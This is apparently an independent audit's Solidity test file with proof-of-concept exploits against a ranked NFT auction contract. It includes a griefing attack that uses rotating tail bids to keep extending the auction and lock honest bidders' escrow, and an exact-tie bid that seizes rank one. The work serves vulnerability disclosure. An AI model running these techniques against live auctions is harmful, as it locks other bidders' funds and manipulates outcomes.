// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import { TestBase, ReentrantReceiver } from "./TestBase.sol";
import { RankedAuction } from "../src/RankedAuction.sol";
import { AuctionEdition } from "../src/AuctionEdition.sol";
import { RoyaltyMarketplace } from "../src/RoyaltyMarketplace.sol";

/// @dev Independent audit proofs, 2026-09-07 (second Fable review). Not part of the package's own suite.
contract AuditFable2Test is TestBase {
    // ---------------------------------------------------------------------------------------------
    // PoC-1: with INCREASE_BPS = 250, a rotating set of k tail bids still extends the auction every
    // window. Tie priority (earlier id wins an exact tie) means each step needs only the 2.5% minimum
    // on ONE bid, so aggregate capital grows by roughly 2.5%/k per five-minute window.
    // ---------------------------------------------------------------------------------------------
    function _stall(uint256 k, uint256 windows) internal returns (uint256 spent, uint256 gasTotal) {
        live();
        for (uint256 i; i < 90 - k; ++i) place(alice, 1 ether); // honest bidders, 1 ETH each
        for (uint256 i; i < k; ++i) place(bob, RESERVE); // griefer's k tail bids at reserve
        uint256 initialEnd = auction.endTime();
        for (uint256 w; w < windows; ++w) {
            uint256 lower = auction.tail();
            uint256 up = bid(lower).prev;
            uint256 delta = auction.minimumIncrease(lower);
            uint256 need = bid(up).amount > bid(lower).amount ? bid(up).amount - bid(lower).amount : 0;
            if (lower > up) need += 1; // a larger id loses an exact tie, so it must strictly exceed
            if (need > delta) delta = need;
            vm.warp(auction.endTime() - 1);
            vm.prank(bob);
            uint256 g = gasleft();
            auction.increaseBid{ value: delta }(lower);
            gasTotal += g - gasleft();
            assertEq(auction.endTime(), block.timestamp + 300, "every step extends");
            spent += delta;
        }
        assertGe(auction.endTime() - initialEnd, windows * 299);
        vm.expectRevert(RankedAuction.AuctionNotEnded.selector);
        auction.settle();
        emit log_named_uint("k rotating tail bids", k);
        emit log_named_uint("windows (x5min)", windows);
        emit log_named_uint("seconds held open past initial end", auction.endTime() - initialEnd);
        emit log_named_uint("griefer wei added", spent);
        emit log_named_uint("griefer total commitment wei", spent + k * RESERVE);
        emit log_named_uint("final tail (= clearing price) wei", bid(auction.tail()).amount);
        emit log_named_uint("gas used by griefer", gasTotal);
        emit log_named_uint("honest escrow locked wei", (90 - k) * 1 ether);
    }

    function testPoC1_StallOneDayWithTwoRotatingTailBids() public {
        _stall(2, 288);
    }

    function testPoC1_StallOneDayWithTenRotatingTailBids() public {
        _stall(10, 288);
    }

    function testPoC1_StallTwoHoursWithTwoRotatingTailBids() public {
        _stall(2, 24);
    }

    // ---------------------------------------------------------------------------------------------
    // PoC-2: exact-tie increases jump ahead of a strictly-earlier-in-time bid. A bid that is placed
    // first at a low amount keeps id priority forever, so it can seize rank #1 (and the full-price
    // tier) by matching the leader exactly. Disclosed (I-01); shown here for the record.
    // ---------------------------------------------------------------------------------------------
    function testPoC2_EarlyLowBidSeizesRankOneByExactTie() public {
        live();
        uint256 low = place(alice, RESERVE); // id 1, placed first
        uint256 lead = place(bob, 5 ether); // id 2, genuine leader
        vm.prank(alice);
        auction.increaseBid{ value: 5 ether - RESERVE }(low); // exact tie
        assertEq(auction.head(), low);
        finish();
        assertEq(bid(low).tokenId, 1);
        assertEq(bid(lead).tokenId, 2);
        assertEq(auction.winningBidCost(low), 5 ether);
        assertEq(auction.winningBidCost(lead), RESERVE);
    }

    // ---------------------------------------------------------------------------------------------
    // PoC-3: a losing (displaced) bidder is never charged and the displacement path never calls out.
    // Sanity check on a path that a griefing receiver could otherwise exploit.
    // ---------------------------------------------------------------------------------------------
    function testPoC3_SelfDisplacementRefundsOwnBidImmediately() public {
        live();
        fill(alice, RESERVE);
        uint256 min = auction.minimumBid();
        place(alice, min);
        assertEq(auction.refunds(alice), RESERVE);
        assertEq(auction.activeCount(), 90);
        assertEq(auction.liabilities(), address(auction).balance);
    }

    // ---------------------------------------------------------------------------------------------
    // PoC-4: the ranked list survives adversarial unlink/insert sequences (pointer integrity check
    // that the non-invariant suite does not assert directly). Used to evaluate extra mutants.
    // ---------------------------------------------------------------------------------------------
    function testPoC4_PointerIntegrityAfterMiddleUnlinkAndReinsert() public {
        live();
        uint256 a = place(alice, 3 ether);
        uint256 b = place(bob, 2 ether);
        uint256 c = place(carol, 1 ether);
        // b moves to head; c's prev must be updated to a.
        vm.prank(bob);
        auction.increaseBid{ value: 2 ether }(b);
        assertEq(bid(c).prev, a, "successor prev updated on unlink");
        assertEq(bid(a).prev, b);
        assertEq(bid(a).next, c);
        // c moves to head; a's prev must be updated to b... then check full chain both directions.
        vm.prank(carol);
        auction.increaseBid{ value: 5 ether }(c);
        uint256 cur = auction.head();
        uint256 prev;
        uint256 n;
        while (cur != 0) {
            assertEq(bid(cur).prev, prev, "prev chain");
            prev = cur;
            cur = bid(cur).next;
            ++n;
        }
        assertEq(prev, auction.tail());
        assertEq(n, 3);
    }

    // ---------------------------------------------------------------------------------------------
    // PoC-5: a listing can be filled at expiry-1 but not at expiry, and settlement at exactly endTime.
    // Boundary checks reused by the extra-mutant run.
    // ---------------------------------------------------------------------------------------------
    function testPoC5_BoundaryAtExactEndTime() public {
        live();
        place(alice, RESERVE);
        vm.warp(auction.endTime() - 300);
        place(alice, RESERVE);
        assertEq(auction.endTime(), auction.initialEndTime(), "exactly five minutes left does not extend");
        vm.warp(auction.endTime());
        vm.expectRevert(RankedAuction.BiddingClosed.selector);
        place(alice, RESERVE);
        auction.settle();
        assertTrue(auction.settled());
    }
}
